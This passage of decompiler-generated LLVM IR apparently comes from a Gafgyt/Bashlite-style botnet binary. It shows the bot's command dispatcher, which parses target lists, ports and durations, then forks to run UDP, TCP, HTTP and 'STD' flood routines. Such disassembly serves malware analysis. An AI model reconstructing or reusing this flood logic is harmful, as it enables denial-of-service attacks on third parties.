dec_label_pc_805e203:                             ; preds = %dec_label_pc_805e184, %dec_label_pc_805e1e1
  %storemerge7 = phi i32 [ %v2_805e1ec, %dec_label_pc_805e1e1 ], [ 10, %dec_label_pc_805e184 ]
  %v4_805e217 = inttoptr i32 %v2_805e18a to i8*
  store i8* %v4_805e217, i8** %stack_var_-188, align 4
  %v5_805e21a = call i32 @__GI_strchr(i8* %v4_805e217, i32 44)
  %v1_805e21f = icmp eq i32 %v5_805e21a, 0
  br i1 %v1_805e21f, label %dec_label_pc_805e29d, label %dec_label_pc_805e223

dec_label_pc_805e223:                             ; preds = %dec_label_pc_805e203
  store i8* %v4_805e217, i8** %stack_var_-188, align 4
  %v4_805e231 = call i32 @__GI_strtok(i32 %v2_805e18a, i32 ptrtoint (i32* @global_var_806e5f1.1493 to i32))
  %v4_805e29538 = icmp eq i32 %v4_805e231, 0
  %v1_805e29945 = icmp eq i1 %v4_805e29538, false
  br i1 %v1_805e29945, label %dec_label_pc_805e23b, label %dec_label_pc_805e2e4

dec_label_pc_805e23b:                             ; preds = %dec_label_pc_805e223, %dec_label_pc_805e27e
  %storemerge846 = phi i32 [ %v4_805e28d, %dec_label_pc_805e27e ], [ %v4_805e231, %dec_label_pc_805e223 ]
  %v0_805e23b = call i32 @listFork()
  %v1_805e240 = icmp eq i32 %v0_805e23b, 0
  %v1_805e242 = icmp eq i1 %v1_805e240, false
  br i1 %v1_805e242, label %dec_label_pc_805e27e, label %dec_label_pc_805e244

dec_label_pc_805e244:                             ; preds = %dec_label_pc_805e23b
  %v4_805e26a = inttoptr i32 %storemerge846 to i8*
  store i8* %v4_805e26a, i8** %stack_var_-188, align 4
  %v8_805e26d = call i32 @sendUDP(i32 %storemerge846, i32 %v2_805e19a, i32 %v2_805e1ad, i32 %v2_805e1c0, i32 %v2_805e1d3, i32 %storemerge7)
  store i8* null, i8** %stack_var_-188, align 4
  %v2_805e279 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_805e27e

dec_label_pc_805e27e:                             ; preds = %dec_label_pc_805e23b, %dec_label_pc_805e244
  store i8* null, i8** %stack_var_-188, align 4
  %v4_805e28d = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_806e5f1.1493 to i32))
  %v4_805e295 = icmp eq i32 %v4_805e28d, 0
  %v1_805e299 = icmp eq i1 %v4_805e295, false
  br i1 %v1_805e299, label %dec_label_pc_805e23b, label %dec_label_pc_805e2e4

dec_label_pc_805e29d:                             ; preds = %dec_label_pc_805e203
  %v0_805e29d = call i32 @listFork()
  %v1_805e2a2 = icmp eq i32 %v0_805e29d, 0
  %v1_805e2a4 = icmp eq i1 %v1_805e2a2, false
  br i1 %v1_805e2a4, label %dec_label_pc_805e903, label %dec_label_pc_805e2aa

dec_label_pc_805e2aa:                             ; preds = %dec_label_pc_805e29d
  store i8* %v4_805e217, i8** %stack_var_-188, align 4
  %v8_805e2d3 = call i32 @sendUDP(i32 %v2_805e18a, i32 %v2_805e19a, i32 %v2_805e1ad, i32 %v2_805e1c0, i32 %v2_805e1d3, i32 %storemerge7)
  store i8* null, i8** %stack_var_-188, align 4
  %v2_805e2df = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_805e2e4

dec_label_pc_805e2e4:                             ; preds = %dec_label_pc_805e27e, %dec_label_pc_805e223, %dec_label_pc_805e0a6, %dec_label_pc_805e2aa
  %v2_805e2e7 = load i32, i32* %arg2, align 4
  store i32 %v2_805e2e7, i32* @eax, align 4
  %v4_805e2f1 = inttoptr i32 %v2_805e2e7 to i8*
  store i8* %v4_805e2f1, i8** %stack_var_-188, align 4
  %v5_805e2f4 = call i32 @__GI_strcoll(i8* %v4_805e2f1, i32 ptrtoint ([5 x i8]* @global_var_806e7ec.1528 to i32))
  %v1_805e2f9 = icmp eq i32 %v5_805e2f4, 0
  %v1_805e2fb = icmp eq i1 %v1_805e2f9, false
  br i1 %v1_805e2fb, label %dec_label_pc_805e47d, label %dec_label_pc_805e301

dec_label_pc_805e301:                             ; preds = %dec_label_pc_805e2e4
  %v7_805e305 = icmp sgt i32 %arg1, 5
  br i1 %v7_805e305, label %dec_label_pc_805e30b, label %dec_label_pc_805e903

dec_label_pc_805e30b:                             ; preds = %dec_label_pc_805e301
  %v1_805e30e = add i32 %tmp86, 4
  %v1_805e311 = inttoptr i32 %v1_805e30e to i32*
  %v2_805e311 = load i32, i32* %v1_805e311, align 4
  %v4_805e31b = inttoptr i32 %v2_805e311 to i8*
  store i8* %v4_805e31b, i8** %stack_var_-188, align 4
  %v5_805e31e = call i32 @__GI_strchr(i8* %v4_805e31b, i32 44)
  %v1_805e323 = icmp eq i32 %v5_805e31e, 0
  br i1 %v1_805e323, label %dec_label_pc_805e3f5, label %dec_label_pc_805e32b

dec_label_pc_805e32b:                             ; preds = %dec_label_pc_805e30b
  %v2_805e331 = load i32, i32* %v1_805e311, align 4
  %v4_805e33b = inttoptr i32 %v2_805e331 to i8*
  store i8* %v4_805e33b, i8** %stack_var_-188, align 4
  %v4_805e33e = call i32 @__GI_strtok(i32 %v2_805e331, i32 ptrtoint (i32* @global_var_806e5f1.1493 to i32))
  %v4_805e3e630 = icmp eq i32 %v4_805e33e, 0
  %v1_805e3ea37 = icmp eq i1 %v4_805e3e630, false
  br i1 %v1_805e3ea37, label %dec_label_pc_805e34b.lr.ph, label %dec_label_pc_805e47d

dec_label_pc_805e34b.lr.ph:                       ; preds = %dec_label_pc_805e32b
  %v1_805e357 = add i32 %tmp86, 24
  %v1_805e35a = inttoptr i32 %v1_805e357 to i32*
  %v1_805e369 = add i32 %tmp86, 20
  %v1_805e36c = inttoptr i32 %v1_805e369 to i32*
  %v1_805e37b = add i32 %tmp86, 16
  %v1_805e37e = inttoptr i32 %v1_805e37b to i32*
  %v1_805e385 = add i32 %tmp86, 12
  %v1_805e388 = inttoptr i32 %v1_805e385 to i32*
  %v1_805e398 = add i32 %tmp86, 8
  %v1_805e39b = inttoptr i32 %v1_805e398 to i32*
  br label %dec_label_pc_805e34b

dec_label_pc_805e34b:                             ; preds = %dec_label_pc_805e34b.lr.ph, %dec_label_pc_805e3cf
  %v0_805e34b = call i32 @listFork()
  %v1_805e350 = icmp eq i32 %v0_805e34b, 0
  %v1_805e352 = icmp eq i1 %v1_805e350, false
  br i1 %v1_805e352, label %dec_label_pc_805e3cf, label %dec_label_pc_805e354

dec_label_pc_805e354:                             ; preds = %dec_label_pc_805e34b
  %v2_805e35a = load i32, i32* %v1_805e35a, align 4
  %v4_805e35c = inttoptr i32 %v2_805e35a to i8*
  store i8* %v4_805e35c, i8** %stack_var_-188, align 4
  %v2_805e35f = call i32 @atol(i32 %v2_805e35a)
  store i32 %v2_805e35f, i32* @ebx, align 4
  %v2_805e36c = load i32, i32* %v1_805e36c, align 4
  %v4_805e36e = inttoptr i32 %v2_805e36c to i8*
  store i8* %v4_805e36e, i8** %stack_var_-188, align 4
  %v2_805e371 = call i32 @atol(i32 %v2_805e36c)
  store i32 %v2_805e371, i32* @esi, align 4
  %v2_805e37e = load i32, i32* %v1_805e37e, align 4
  store i32 %v2_805e37e, i32* @edi, align 4
  %v2_805e388 = load i32, i32* %v1_805e388, align 4
  %v4_805e38a = inttoptr i32 %v2_805e388 to i8*
  store i8* %v4_805e38a, i8** %stack_var_-188, align 4
  %v2_805e38d = call i32 @atol(i32 %v2_805e388)
  %v1_805e392 = urem i32 %v2_805e38d, 65536
  %v2_805e39b = load i32, i32* %v1_805e39b, align 4
  %v2_805e3a5 = load i32, i32* %v1_805e311, align 4
  %v0_805e3a7 = load i32, i32* @ebx, align 4
  %v0_805e3ab = load i32, i32* @esi, align 4
  %v0_805e3af = load i32, i32* @edi, align 4
  %v4_805e3bb = inttoptr i32 %v2_805e3a5 to i8*
  store i8* %v4_805e3bb, i8** %stack_var_-188, align 4
  %v9_805e3be = call i32 @sendHTTP(i8* %v4_805e3bb, i32 %v2_805e39b, i32 %v1_805e392, i32 %v0_805e3af, i32 %v0_805e3ab, i32 %v0_805e3a7)
  store i8* null, i8** %stack_var_-188, align 4
  %v2_805e3ca = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_805e3cf

dec_label_pc_805e3cf:                             ; preds = %dec_label_pc_805e34b, %dec_label_pc_805e354
  store i8* null, i8** %stack_var_-188, align 4
  %v4_805e3de = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_806e5f1.1493 to i32))
  %v4_805e3e6 = icmp eq i32 %v4_805e3de, 0
  %v1_805e3ea = icmp eq i1 %v4_805e3e6, false
  br i1 %v1_805e3ea, label %dec_label_pc_805e34b, label %dec_label_pc_805e47d

dec_label_pc_805e3f5:                             ; preds = %dec_label_pc_805e30b
  %v0_805e3f5 = call i32 @listFork()
  %v1_805e3fa = icmp eq i32 %v0_805e3f5, 0
  %v1_805e3fc = icmp eq i1 %v1_805e3fa, false
  br i1 %v1_805e3fc, label %dec_label_pc_805e903, label %dec_label_pc_805e402

dec_label_pc_805e402:                             ; preds = %dec_label_pc_805e3f5
  %v1_805e405 = add i32 %tmp86, 24
  %v1_805e408 = inttoptr i32 %v1_805e405 to i32*
  %v2_805e408 = load i32, i32* %v1_805e408, align 4
  %v4_805e40a = inttoptr i32 %v2_805e408 to i8*
  store i8* %v4_805e40a, i8** %stack_var_-188, align 4
  %v2_805e40d = call i32 @atol(i32 %v2_805e408)
  store i32 %v2_805e40d, i32* @ebx, align 4
  %v1_805e417 = add i32 %tmp86, 20
  %v1_805e41a = inttoptr i32 %v1_805e417 to i32*
  %v2_805e41a = load i32, i32* %v1_805e41a, align 4
  %v4_805e41c = inttoptr i32 %v2_805e41a to i8*
  store i8* %v4_805e41c, i8** %stack_var_-188, align 4
  %v2_805e41f = call i32 @atol(i32 %v2_805e41a)
  store i32 %v2_805e41f, i32* @esi, align 4
  %v1_805e429 = add i32 %tmp86, 16
  %v1_805e42c = inttoptr i32 %v1_805e429 to i32*
  %v2_805e42c = load i32, i32* %v1_805e42c, align 4
  store i32 %v2_805e42c, i32* @edi, align 4
  %v1_805e433 = add i32 %tmp86, 12
  %v1_805e436 = inttoptr i32 %v1_805e433 to i32*
  %v2_805e436 = load i32, i32* %v1_805e436, align 4
  %v4_805e438 = inttoptr i32 %v2_805e436 to i8*
  store i8* %v4_805e438, i8** %stack_var_-188, align 4
  %v2_805e43b = call i32 @atol(i32 %v2_805e436)
  %v1_805e440 = urem i32 %v2_805e43b, 65536
  %v1_805e446 = add i32 %tmp86, 8
  %v1_805e449 = inttoptr i32 %v1_805e446 to i32*
  %v2_805e449 = load i32, i32* %v1_805e449, align 4
  %v2_805e453 = load i32, i32* %v1_805e311, align 4
  %v0_805e455 = load i32, i32* @ebx, align 4
  %v0_805e459 = load i32, i32* @esi, align 4
  %v0_805e45d = load i32, i32* @edi, align 4
  %v4_805e469 = inttoptr i32 %v2_805e453 to i8*
  store i8* %v4_805e469, i8** %stack_var_-188, align 4
  %v9_805e46c = call i32 @sendHTTP(i8* %v4_805e469, i32 %v2_805e449, i32 %v1_805e440, i32 %v0_805e45d, i32 %v0_805e459, i32 %v0_805e455)
  store i8* null, i8** %stack_var_-188, align 4
  %v2_805e478 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_805e47d

dec_label_pc_805e47d:                             ; preds = %dec_label_pc_805e3cf, %dec_label_pc_805e32b, %dec_label_pc_805e2e4, %dec_label_pc_805e402
  %v2_805e480 = load i32, i32* %arg2, align 4
  store i32 %v2_805e480, i32* @eax, align 4
  %v4_805e48a = inttoptr i32 %v2_805e480 to i8*
  store i8* %v4_805e48a, i8** %stack_var_-188, align 4
  %v5_805e48d = call i32 @__GI_strcoll(i8* %v4_805e48a, i32 ptrtoint ([4 x i8]* @global_var_806e7f1.1529 to i32))
  %v1_805e492 = icmp eq i32 %v5_805e48d, 0
  %v1_805e494 = icmp eq i1 %v1_805e492, false
  br i1 %v1_805e494, label %dec_label_pc_805e5b4, label %dec_label_pc_805e49a

dec_label_pc_805e49a:                             ; preds = %dec_label_pc_805e47d
  %v7_805e49e = icmp sgt i32 %arg1, 3
  br i1 %v7_805e49e, label %dec_label_pc_805e4a4, label %dec_label_pc_805e903

dec_label_pc_805e4a4:                             ; preds = %dec_label_pc_805e49a
  %v1_805e4a7 = add i32 %tmp86, 8
  %v1_805e4aa = inttoptr i32 %v1_805e4a7 to i32*
  %v2_805e4aa = load i32, i32* %v1_805e4aa, align 4
  %v4_805e4ac = inttoptr i32 %v2_805e4aa to i8*
  store i8* %v4_805e4ac, i8** %stack_var_-188, align 4
  %v2_805e4af = call i32 @atol(i32 %v2_805e4aa)
  %tmp95 = icmp slt i32 %v2_805e4af, 1
  br i1 %tmp95, label %dec_label_pc_805e903, label %dec_label_pc_805e4bc

dec_label_pc_805e4bc:                             ; preds = %dec_label_pc_805e4a4
  %v1_805e4bf = add i32 %tmp86, 12
  %v1_805e4c2 = inttoptr i32 %v1_805e4bf to i32*
  %v2_805e4c2 = load i32, i32* %v1_805e4c2, align 4
  %v4_805e4c4 = inttoptr i32 %v2_805e4c2 to i8*
  store i8* %v4_805e4c4, i8** %stack_var_-188, align 4
  %v2_805e4c7 = call i32 @atol(i32 %v2_805e4c2)
  %tmp96 = icmp slt i32 %v2_805e4c7, 1
  %tmp97 = icmp eq i1 %tmp96, false
  br i1 %tmp97, label %dec_label_pc_805e4d5, label %dec_label_pc_805e903

dec_label_pc_805e4d5:                             ; preds = %dec_label_pc_805e4bc
  %v1_805e4d8 = add i32 %tmp86, 4
  %v1_805e4db = inttoptr i32 %v1_805e4d8 to i32*
  %v2_805e4db = load i32, i32* %v1_805e4db, align 4
  %v2_805e4e6 = load i32, i32* %v1_805e4aa, align 4
  %v4_805e4e8 = inttoptr i32 %v2_805e4e6 to i8*
  store i8* %v4_805e4e8, i8** %stack_var_-188, align 4
  %v2_805e4eb = call i32 @atol(i32 %v2_805e4e6)
  %v2_805e4f9 = load i32, i32* %v1_805e4c2, align 4
  %v4_805e4fb = inttoptr i32 %v2_805e4f9 to i8*
  store i8* %v4_805e4fb, i8** %stack_var_-188, align 4
  %v2_805e4fe = call i32 @atol(i32 %v2_805e4f9)
  %v4_805e511 = inttoptr i32 %v2_805e4db to i8*
  store i8* %v4_805e511, i8** %stack_var_-188, align 4
  %v5_805e514 = call i32 @__GI_strchr(i8* %v4_805e511, i32 44)
  %v1_805e519 = icmp eq i32 %v5_805e514, 0
  br i1 %v1_805e519, label %dec_label_pc_805e582, label %dec_label_pc_805e51d

dec_label_pc_805e51d:                             ; preds = %dec_label_pc_805e4d5
  store i8* %v4_805e511, i8** %stack_var_-188, align 4
  %v4_805e52b = call i32 @__GI_strtok(i32 %v2_805e4db, i32 ptrtoint (i32* @global_var_806e5f1.1493 to i32))
  %v4_805e57a21 = icmp eq i32 %v4_805e52b, 0
  %v1_805e57e28 = icmp eq i1 %v4_805e57a21, false
  br i1 %v1_805e57e28, label %dec_label_pc_805e535.lr.ph, label %dec_label_pc_805e5b4

dec_label_pc_805e535.lr.ph:                       ; preds = %dec_label_pc_805e51d
  %v5_805e552 = trunc i32 %v2_805e4eb to i16
  br label %dec_label_pc_805e535

dec_label_pc_805e535:                             ; preds = %dec_label_pc_805e535.lr.ph, %dec_label_pc_805e563
  %storemerge1029 = phi i32 [ %v4_805e52b, %dec_label_pc_805e535.lr.ph ], [ %v4_805e572, %dec_label_pc_805e563 ]
  %v0_805e535 = call i32 @listFork()
  %v1_805e53a = icmp eq i32 %v0_805e535, 0
  %v1_805e53c = icmp eq i1 %v1_805e53a, false
  br i1 %v1_805e53c, label %dec_label_pc_805e563, label %dec_label_pc_805e53e

dec_label_pc_805e53e:                             ; preds = %dec_label_pc_805e535
  %v4_805e54f = inttoptr i32 %storemerge1029 to i8*
  store i8* %v4_805e54f, i8** %stack_var_-188, align 4
  %v6_805e552 = call i32 @sendSTD(i32 %storemerge1029, i16 %v5_805e552, i32 %v2_805e4fe)
  store i8* null, i8** %stack_var_-188, align 4
  %v2_805e55e = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_805e563

dec_label_pc_805e563:                             ; preds = %dec_label_pc_805e535, %dec_label_pc_805e53e
  store i8* null, i8** %stack_var_-188, align 4
  %v4_805e572 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_806e5f1.1493 to i32))
  %v4_805e57a = icmp eq i32 %v4_805e572, 0
  %v1_805e57e = icmp eq i1 %v4_805e57a, false
  br i1 %v1_805e57e, label %dec_label_pc_805e535, label %dec_label_pc_805e5b4

dec_label_pc_805e582:                             ; preds = %dec_label_pc_805e4d5
  %v0_805e582 = call i32 @listFork()
  %v1_805e587 = icmp eq i32 %v0_805e582, 0
  %v1_805e589 = icmp eq i1 %v1_805e587, false
  br i1 %v1_805e589, label %dec_label_pc_805e903, label %dec_label_pc_805e58f

dec_label_pc_805e58f:                             ; preds = %dec_label_pc_805e582
  store i8* %v4_805e511, i8** %stack_var_-188, align 4
  %v5_805e5a3 = trunc i32 %v2_805e4eb to i16
  %v6_805e5a3 = call i32 @sendSTD(i32 %v2_805e4db, i16 %v5_805e5a3, i32 %v2_805e4fe)
  store i8* null, i8** %stack_var_-188, align 4
  %v2_805e5af = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_805e5b4

dec_label_pc_805e5b4:                             ; preds = %dec_label_pc_805e563, %dec_label_pc_805e51d, %dec_label_pc_805e47d, %dec_label_pc_805e58f
  %v2_805e5b7 = load i32, i32* %arg2, align 4
  store i32 %v2_805e5b7, i32* @eax, align 4
  %v4_805e5c1 = inttoptr i32 %v2_805e5b7 to i8*
  store i8* %v4_805e5c1, i8** %stack_var_-188, align 4
  %v5_805e5c4 = call i32 @__GI_strcoll(i8* %v4_805e5c1, i32 ptrtoint ([4 x i8]* @global_var_806e7f5.1530 to i32))
  %v1_805e5c9 = icmp eq i32 %v5_805e5c4, 0
  %v1_805e5cb = icmp eq i1 %v1_805e5c9, false
  br i1 %v1_805e5cb, label %dec_label_pc_805e817, label %dec_label_pc_805e5d1

dec_label_pc_805e5d1:                             ; preds = %dec_label_pc_805e5b4
  %v7_805e5d5 = icmp sgt i32 %arg1, 5
  br i1 %v7_805e5d5, label %dec_label_pc_805e5db, label %dec_label_pc_805e903

dec_label_pc_805e5db:                             ; preds = %dec_label_pc_805e5d1
  %v1_805e5de = add i32 %tmp86, 12
  %v1_805e5e1 = inttoptr i32 %v1_805e5de to i32*
  %v2_805e5e1 = load i32, i32* %v1_805e5e1, align 4
  %v4_805e5e3 = inttoptr i32 %v2_805e5e1 to i8*
  store i8* %v4_805e5e3, i8** %stack_var_-188, align 4
  %v2_805e5e6 = call i32 @atol(i32 %v2_805e5e1)
  %v10_805e5eb = icmp eq i32 %v2_805e5e6, -1
  br i1 %v10_805e5eb, label %dec_label_pc_805e903, label %dec_label_pc_805e5f4

dec_label_pc_805e5f4:                             ; preds = %dec_label_pc_805e5db
  %v1_805e5f7 = add i32 %tmp86, 8
  %v1_805e5fa = inttoptr i32 %v1_805e5f7 to i32*
  %v2_805e5fa = load i32, i32* %v1_805e5fa, align 4
  %v4_805e5fc = inttoptr i32 %v2_805e5fa to i8*
  store i8* %v4_805e5fc, i8** %stack_var_-188, align 4
  %v2_805e5ff = call i32 @atol(i32 %v2_805e5fa)
  %v10_805e604 = icmp eq i32 %v2_805e5ff, -1
  br i1 %v10_805e604, label %dec_label_pc_805e903, label %dec_label_pc_805e60d

dec_label_pc_805e60d:                             ; preds = %dec_label_pc_805e5f4
  %v1_805e610 = add i32 %tmp86, 16
  %v1_805e613 = inttoptr i32 %v1_805e610 to i32*
  %v2_805e613 = load i32, i32* %v1_805e613, align 4
  %v4_805e615 = inttoptr i32 %v2_805e613 to i8*
  store i8* %v4_805e615, i8** %stack_var_-188, align 4
  %v2_805e618 = call i32 @atol(i32 %v2_805e613)
  %v10_805e61d = icmp eq i32 %v2_805e618, -1
  br i1 %v10_805e61d, label %dec_label_pc_805e903, label %dec_label_pc_805e626

dec_label_pc_805e626:                             ; preds = %dec_label_pc_805e60d
  %v2_805e62c = load i32, i32* %v1_805e613, align 4
  %v4_805e62e = inttoptr i32 %v2_805e62c to i8*
  store i8* %v4_805e62e, i8** %stack_var_-188, align 4
  %v2_805e631 = call i32 @atol(i32 %v2_805e62c)
  %v1_805e636 = add i32 %v2_805e631, -32
  %v3_805e636 = sub i32 31, %v2_805e631
  %v4_805e636 = and i32 %v3_805e636, %v2_805e631
  %v5_805e636 = icmp slt i32 %v4_805e636, 0
  %v6_805e636 = icmp eq i32 %v1_805e636, 0
  %v7_805e636 = icmp slt i32 %v1_805e636, 0
  %v3_805e639 = icmp eq i1 %v7_805e636, %v5_805e636
  %v4_805e639 = icmp eq i1 %v6_805e636, false
  %v5_805e639 = and i1 %v4_805e639, %v3_805e639
  br i1 %v5_805e639, label %dec_label_pc_805e903, label %dec_label_pc_805e63f

dec_label_pc_805e63f:                             ; preds = %dec_label_pc_805e626
  %v7_805e643 = icmp sgt i32 %arg1, 6
  br i1 %v7_805e643, label %dec_label_pc_805e645, label %dec_label_pc_805e65d

dec_label_pc_805e645:                             ; preds = %dec_label_pc_805e63f
  %v1_805e648 = add i32 %tmp86, 24
  %v1_805e64b = inttoptr i32 %v1_805e648 to i32*
  %v2_805e64b = load i32, i32* %v1_805e64b, align 4
  %v4_805e64d = inttoptr i32 %v2_805e64b to i8*
  store i8* %v4_805e64d, i8** %stack_var_-188, align 4
  %v2_805e650 = call i32 @atol(i32 %v2_805e64b)
  %v2_805e655 = icmp slt i32 %v2_805e650, 0
  br i1 %v2_805e655, label %dec_label_pc_805e903, label %dec_label_pc_805e65d

dec_label_pc_805e65d:                             ; preds = %dec_label_pc_805e63f, %dec_label_pc_805e645
  %v12_805e65d = icmp eq i32 %arg1, 8
  %v1_805e661 = icmp eq i1 %v12_805e65d, false
  br i1 %v1_805e661, label %dec_label_pc_805e67c, label %dec_label_pc_805e663

dec_label_pc_805e663:                             ; preds = %dec_label_pc_805e65d
  %v1_805e666 = add i32 %tmp86, 28
  %v1_805e669 = inttoptr i32 %v1_805e666 to i32*
  %v2_805e669 = load i32, i32* %v1_805e669, align 4
  %v4_805e66b = inttoptr i32 %v2_805e669 to i8*
  store i8* %v4_805e66b, i8** %stack_var_-188, align 4
  %v2_805e66e = call i32 @atol(i32 %v2_805e669)
  %tmp98 = icmp slt i32 %v2_805e66e, 1
  %tmp99 = icmp eq i1 %tmp98, false
  br i1 %tmp99, label %dec_label_pc_805e67c, label %dec_label_pc_805e903

dec_label_pc_805e67c:                             ; preds = %dec_label_pc_805e663, %dec_label_pc_805e65d
  %v1_805e67f = add i32 %tmp86, 4
  %v1_805e682 = inttoptr i32 %v1_805e67f to i32*
  %v2_805e682 = load i32, i32* %v1_805e682, align 4
  %v2_805e68d = load i32, i32* %v1_805e5fa, align 4
  %v4_805e68f = inttoptr i32 %v2_805e68d to i8*
  store i8* %v4_805e68f, i8** %stack_var_-188, align 4
  %v2_805e692 = call i32 @atol(i32 %v2_805e68d)
  %v2_805e6a0 = load i32, i32* %v1_805e5e1, align 4
  %v4_805e6a2 = inttoptr i32 %v2_805e6a0 to i8*
  store i8* %v4_805e6a2, i8** %stack_var_-188, align 4
  %v2_805e6a5 = call i32 @atol(i32 %v2_805e6a0)
  %v2_805e6b3 = load i32, i32* %v1_805e613, align 4
  %v4_805e6b5 = inttoptr i32 %v2_805e6b3 to i8*
  store i8* %v4_805e6b5, i8** %stack_var_-188, align 4
  %v2_805e6b8 = call i32 @atol(i32 %v2_805e6b3)
  %v1_805e6c3 = add i32 %tmp86, 20
  %v1_805e6c6 = inttoptr i32 %v1_805e6c3 to i32*
  %v2_805e6c6 = load i32, i32* %v1_805e6c6, align 4
  br i1 %v1_805e661, label %dec_label_pc_805e6f3, label %dec_label_pc_805e6d1

dec_label_pc_805e6d1:                             ; preds = %dec_label_pc_805e67c
  %v1_805e6d4 = add i32 %tmp86, 28
  %v1_805e6d7 = inttoptr i32 %v1_805e6d4 to i32*
  %v2_805e6d7 = load i32, i32* %v1_805e6d7, align 4
  %v4_805e6d9 = inttoptr i32 %v2_805e6d7 to i8*
  store i8* %v4_805e6d9, i8** %stack_var_-188, align 4
  %v2_805e6dc = call i32 @atol(i32 %v2_805e6d7)
  br label %dec_label_pc_805e6f3

dec_label_pc_805e6f3:                             ; preds = %dec_label_pc_805e67c, %dec_label_pc_805e6d1
  %storemerge3 = phi i32 [ %v2_805e6dc, %dec_label_pc_805e6d1 ], [ 10, %dec_label_pc_805e67c ]
  store i32 %storemerge3, i32* @edx, align 4
  br i1 %v7_805e643, label %dec_label_pc_805e702, label %dec_label_pc_805e724

dec_label_pc_805e702:                             ; preds = %dec_label_pc_805e6f3
  %v1_805e705 = add i32 %tmp86, 24
  %v1_805e708 = inttoptr i32 %v1_805e705 to i32*
  %v2_805e708 = load i32, i32* %v1_805e708, align 4
  %v4_805e70a = inttoptr i32 %v2_805e708 to i8*
  store i8* %v4_805e70a, i8** %stack_var_-188, align 4
  %v2_805e70d = call i32 @atol(i32 %v2_805e708)
  br label %dec_label_pc_805e724

dec_label_pc_805e724:                             ; preds = %dec_label_pc_805e6f3, %dec_label_pc_805e702
  %storemerge2 = phi i32 [ %v2_805e70d, %dec_label_pc_805e702 ], [ 0, %dec_label_pc_805e6f3 ]
  %v4_805e738 = inttoptr i32 %v2_805e682 to i8*
  store i8* %v4_805e738, i8** %stack_var_-188, align 4
  %v5_805e73b = call i32 @__GI_strchr(i8* %v4_805e738, i32 44)
  %v1_805e740 = icmp eq i32 %v5_805e73b, 0
  br i1 %v1_805e740, label %dec_label_pc_805e7c9, label %dec_label_pc_805e748

dec_label_pc_805e748:                             ; preds = %dec_label_pc_805e724
  store i8* %v4_805e738, i8** %stack_var_-188, align 4
  %v4_805e756 = call i32 @__GI_strtok(i32 %v2_805e682, i32 ptrtoint (i32* @global_var_806e5f1.1493 to i32))
  %v4_805e7c112 = icmp eq i32 %v4_805e756, 0
  %v1_805e7c519 = icmp eq i1 %v4_805e7c112, false
  br i1 %v1_805e7c519, label %dec_label_pc_805e760, label %dec_label_pc_805e817

dec_label_pc_805e760:                             ; preds = %dec_label_pc_805e748, %dec_label_pc_805e7aa
  %storemerge1120 = phi i32 [ %v4_805e7b9, %dec_label_pc_805e7aa ], [ %v4_805e756, %dec_label_pc_805e748 ]
  %v0_805e760 = call i32 @listFork()
  %v1_805e765 = icmp eq i32 %v0_805e760, 0
  %v1_805e767 = icmp eq i1 %v1_805e765, false
  br i1 %v1_805e767, label %dec_label_pc_805e7aa, label %dec_label_pc_805e769

dec_label_pc_805e769:                             ; preds = %dec_label_pc_805e760
  %v4_805e796 = inttoptr i32 %storemerge1120 to i8*
  store i8* %v4_805e796, i8** %stack_var_-188, align 4
  %v9_805e799 = call i32 @sendTCP(i32 %storemerge1120, i32 %v2_805e692, i32 %v2_805e6a5, i32 %v2_805e6b8, i32 %v2_805e6c6, i32 %storemerge2, i32 %storemerge3)
  store i8* null, i8** %stack_var_-188, align 4
  %v2_805e7a5 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_805e7aa

dec_label_pc_805e7aa:                             ; preds = %dec_label_pc_805e760, %dec_label_pc_805e769
  store i8* null, i8** %stack_var_-188, align 4
  %v4_805e7b9 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_806e5f1.1493 to i32))
  %v4_805e7c1 = icmp eq i32 %v4_805e7b9, 0
  %v1_805e7c5 = icmp eq i1 %v4_805e7c1, false
  br i1 %v1_805e7c5, label %dec_label_pc_805e760, label %dec_label_pc_805e817

dec_label_pc_805e7c9:                             ; preds = %dec_label_pc_805e724
  %v0_805e7c9 = call i32 @listFork()
  %v1_805e7ce = icmp eq i32 %v0_805e7c9, 0
  %v1_805e7d0 = icmp eq i1 %v1_805e7ce, false
  br i1 %v1_805e7d0, label %dec_label_pc_805e903, label %dec_label_pc_805e7d6

dec_label_pc_805e7d6:                             ; preds = %dec_label_pc_805e7c9
  store i8* %v4_805e738, i8** %stack_var_-188, align 4
  %v9_805e806 = call i32 @sendTCP(i32 %v2_805e682, i32 %v2_805e692, i32 %v2_805e6a5, i32 %v2_805e6b8, i32 %v2_805e6c6, i32 %storemerge2, i32 %storemerge3)
  store i8* null, i8** %stack_var_-188, align 4
  %v2_805e812 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_805e817

dec_label_pc_805e817:                             ; preds = %dec_label_pc_805e7aa, %dec_label_pc_805e748, %dec_label_pc_805e5b4, %dec_label_pc_805e7d6
  %v2_805e81a = load i32, i32* %arg2, align 4
  store i32 %v2_805e81a, i32* @eax, align 4
  %v4_805e824 = inttoptr i32 %v2_805e81a to i8*
  store i8* %v4_805e824, i8** %stack_var_-188, align 4
  %v5_805e827 = call i32 @__GI_strcoll(i8* %v4_805e824, i32 ptrtoint ([5 x i8]* @global_var_806e7f9.1531 to i32))
  %v1_805e82c = icmp eq i32 %v5_805e827, 0
  %v1_805e82e = icmp eq i1 %v1_805e82c, false
  br i1 %v1_805e82e, label %dec_label_pc_805e8de, label %dec_label_pc_805e89f

dec_label_pc_805e844:                             ; preds = %dec_label_pc_805e89f, %dec_label_pc_805e8ca
  %v2_805e847 = mul i32 %storemerge, 4
  %v0_805e84c = load i32, i32* @global_var_8078874.36, align 4
  %v2_805e851 = add i32 %v0_805e84c, %v2_805e847
  %v1_805e854 = inttoptr i32 %v2_805e851 to i32*
  %v2_805e854 = load i32, i32* %v1_805e854, align 4
  %v1_805e856 = icmp eq i32 %v2_805e854, 0
  br i1 %v1_805e856, label %dec_label_pc_805e89b, label %dec_label_pc_805e85a

dec_label_pc_805e85a:                             ; preds = %dec_label_pc_805e844
